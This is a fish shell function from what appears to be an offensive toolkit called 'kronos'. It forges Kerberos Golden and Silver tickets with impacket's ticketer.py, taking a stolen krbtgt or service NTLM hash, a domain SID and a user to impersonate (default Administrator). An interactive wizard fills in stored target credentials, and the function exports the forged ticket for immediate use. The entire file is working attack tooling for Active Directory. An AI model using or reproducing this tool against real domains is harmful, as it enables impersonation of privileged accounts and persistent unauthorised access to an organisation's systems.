# description: Create Golden and Silver Tickets (Interactive & Flags)
function __kronos_ticket --description "Create Golden and Silver Tickets using ticketer.py"
    set -l subaction $argv[1]
    set -l wizard 0
    if contains -- "$subaction" golden silver
        set wizard 1
        set -e argv[1]
    end

    argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos ticket [golden|silver] [OPTIONS]"
        echo ""
        echo "Create Golden or Silver tickets using impacket's ticketer.py."
        echo "If 'golden' or 'silver' is specified without all required flags,"
        echo "an interactive wizard will guide you through the process."
        echo ""
        echo "Options:"
        echo "  -u, --user USER     User to create the ticket for (default: Administrator)"
        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_DC_DOMAIN)"
        echo "  -S, --sid SID       Domain SID"
        echo "  -H, --hash HASH     krbtgt NTLM hash (Golden) or service NTLM hash (Silver)"
        echo "  -s, --spn SPN       Target SPN (for Silver Ticket, e.g., cifs/dc.domain.com)"
        echo "  -h, --help          Show this help message"
        return 0
    end

    # Capture flags first
    set -l domain $_flag_domain
    set -l user $_flag_user
    set -l sid $_flag_sid
    set -l hash $_flag_hash
    set -l spn $_flag_spn

    if test "$wizard" -eq 1
        set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
        
        # Priority: 1. Flag, 2. TGT default, 3. Empty
        set -l def_hash "$TGT_CRED_PASSWORD"
        if test -n "$hash"; set def_hash "$hash"; end
        set hash (__kronos_ask "NTLM Hash" "$def_hash"); or return 1

        set -l def_sid ""
        if test -n "$sid"; set def_sid "$sid"; end
        set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1

        set -l def_domain "$TGT_DC_DOMAIN"
        if test -n "$domain"; set def_domain "$domain"; end
        set domain (__kronos_ask "Domain FQDN" "$def_domain"); or return 1

        set -l def_user "Administrator"
        if test -n "$user"; set def_user "$user"; end
        set user (__kronos_ask "User to impersonate" "$def_user"); or return 1
        
        if test "$subaction" = "silver"
            set -l def_spn ""
            if test -n "$spn"; set def_spn "$spn"; end
            set spn (__kronos_ask "Target SPN (e.g. cifs/dc01.dante.local)" "$def_spn"); or return 1
        end
    else
        # Non-wizard fallbacks for standard flag usage
        if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
        if test -z "$user"; set user "Administrator"; end
    end

    # Final Validation
    if test -z "$domain"; echo "error: domain is required (-d)"; return 1; end
    if test -z "$sid"; echo "error: domain SID is required (-S)"; return 1; end
    if test -z "$hash"; echo "error: hash is required (-H)"; return 1; end
    if test "$subaction" = "silver" -a -z "$spn"; echo "error: SPN is required for silver tickets (-s)"; return 1; end

    set -l impacket_cmd ""
    if command -v ticketer.py >/dev/null
        set impacket_cmd ticketer.py
    else if command -v impacket-ticketer >/dev/null
        set impacket_cmd impacket-ticketer
    else
        echo "error: ticketer not found. run 'kronos install'." >&2
        return 1
    end

    set -l ticket_args -nthash "$hash" -domain-sid "$sid" -domain "$domain"
    if test -n "$spn"
        set -a ticket_args -spn "$spn"
        echo "[*] Forging Silver Ticket for $user via $impacket_cmd..."
    else
        echo "[*] Forging Golden Ticket for $user via $impacket_cmd..."
    end
    set -a ticket_args "$user"

    command $impacket_cmd $ticket_args
    
    if test -f "$user.ccache"
        set -gx KRB5CCNAME "$PWD/$user.ccache"
        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
    end
end
